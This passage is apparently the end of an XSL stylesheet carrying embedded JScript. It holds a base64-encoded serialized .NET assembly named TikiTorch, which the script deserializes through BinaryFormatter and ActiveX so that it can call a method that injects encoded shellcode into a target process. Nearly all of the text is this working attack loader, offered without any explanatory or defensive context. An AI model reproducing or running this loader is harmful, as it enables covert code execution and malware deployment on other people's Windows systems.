"BCABGBgFIAEBERAGIAIBDh0FCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dz"+
"AQgBAAcBAAAAAA4BAAlUaWtpVG9yY2gAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTkAACkB"+
"ACQyZmZhZmFhMy1jMmI2LTQzMWItYjdiNC0wZTg2NGY2MmM3Y2IAAAwBAAcxLjAuMC4wAABJAQAa"+
"Lk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjUBAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lEi5ORVQg"+
"RnJhbWV3b3JrIDQuNQUBAAEAAAQBAAAAAAAAAACO9Kz5AAAAAAIAAABRAAAAvEQAALwmAAAAAAAA"+
"AAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAUlNEU2IMnbijLlZAkB/G91Sv5RMBAAAAQzpcVG9vbHNc"+
"VGlraVRvcmNoXFRpa2lUb3JjaFxvYmpceDY0XERlYnVnXFRpa2lUb3JjaC5wZGIAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAA"+
"AAAAAAAAAAAAAAABAAAAAABIAAAAWGAAABwDAAAAAAAAAAAAABwDNAAAAFYAUwBfAFYARQBSAFMA"+
"SQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAAC"+
"AAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIA"+
"YQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAR8AgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBm"+
"AG8AAABYAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAA"+
"IgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAPAAKAAEARgBpAGwAZQBEAGUAcwBj"+
"AHIAaQBwAHQAaQBvAG4AAAAAAFQAaQBrAGkAVABvAHIAYwBoAAAAMAAIAAEARgBpAGwAZQBWAGUA"+
"cgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAPAAOAAEASQBuAHQAZQByAG4AYQBsAE4AYQBt"+
"AGUAAABUAGkAawBpAFQAbwByAGMAaAAuAGQAbABsAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkA"+
"cgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA5AAAAKgABAAEATABl"+
"AGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABEAA4AAQBPAHIAaQBnAGkAbgBhAGwA"+
"RgBpAGwAZQBuAGEAbQBlAAAAVABpAGsAaQBUAG8AcgBjAGgALgBkAGwAbAAAADQACgABAFAAcgBv"+
"AGQAdQBjAHQATgBhAG0AZQAAAAAAVABpAGsAaQBUAG8AcgBjAGgAAAA0AAgAAQBQAHIAbwBkAHUA"+
"YwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5"+
"ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2Vt"+
"Ymx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TikiTorch';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	o.Flame(targetProcess, encodedShellcode);
	
} catch (e) {
    debug(e.message);
}
        ]]> </ms:script>
</stylesheet>

